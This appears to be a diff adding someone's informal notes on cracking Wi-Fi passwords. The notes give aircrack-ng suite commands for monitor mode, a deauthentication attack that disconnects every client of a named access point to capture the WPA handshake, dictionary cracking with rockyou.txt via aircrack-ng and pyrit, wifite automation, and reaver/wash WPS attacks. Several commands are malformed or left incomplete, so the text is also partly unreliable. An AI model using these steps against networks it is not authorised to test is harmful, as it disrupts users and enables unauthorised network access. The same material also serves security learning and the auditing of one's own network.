@@ -1,0 +1,17 @@
+Site: routerpwn.com, wardriving-forum.de. In it we can google first 3 hex-digits on site wardriving-forum.de
+commands: airmon-ng start wlan0
+Disable all clients: aireplay -ng -0 2 -a 14 DA E9 82 49 CC mon0 --ignore-negative-one. Tries to disconnect all clients,
+they automatically try to reauth, and we can catch their handshake. Handshake - messages between router and client,
+router tries understand if client knows password.
+Then we try to broot using /usr/share/wordlists/rockyou.txt.gz - dictionary
+We can broot : 1) using CPU (slow) 2) using GPU (good) 3) Rainbow tables (smth)
+>pyrit - better to use for nvidia gpus
+//man aircrack-ng
+aircrack-ng -b AA:AA:..:AA -w rockyou.txt file.ivs //AA:AA:.. - point of access, that we got. Capture file, better the last file
+Utilite: wifite - GOOD utility, can automize(?). Then Ctrl+C, and number of network.
+or wifite -dict rockyou.txt - automatically does the same we've seen earlier.
+//Another utility
+>reaver
+>reaver -i mon0 -b
+or another utility
+>wash -i mon0 -C
